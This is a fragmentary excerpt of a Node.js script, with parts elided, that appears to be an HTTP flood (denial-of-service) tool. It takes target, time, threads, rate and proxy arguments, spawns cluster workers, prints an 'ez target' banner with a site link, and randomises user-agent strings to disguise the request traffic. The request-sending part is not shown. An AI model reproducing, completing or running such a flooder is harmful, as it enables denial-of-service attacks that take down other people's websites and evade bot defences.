...
if (process.argv.length < 7) {
    console.log(`Usage: ${process.argv[1]} target time threads rate proxy`)
    process.exit(1)
}
...
if (cluster.isMaster) {
    console.log('ez target | https://web.dodanhtai.site/');
    ...
    function generateRandomUserAgent() {
        const platform = ['Win32', 'Win64', 'MacIntel', 'Linux x86_64'];
        const browser = ['Chrome', 'Firefox', 'Safari', 'Edge', 'Opera'];
        ...
        const version = Math.floor(Math.random() * 50) + 50; // Example: version 50 to 99

        return `Mozilla/5.0 (${randomPlatform}) AppleWebKit/537.36 (KHTML, like Gecko) ${randomBrowser}/${version}.0`;
    }
    ...
    function main() {
        ...
        // Use the generated random user-agent
        payload['user-agent'] = generateRandomUserAgent();
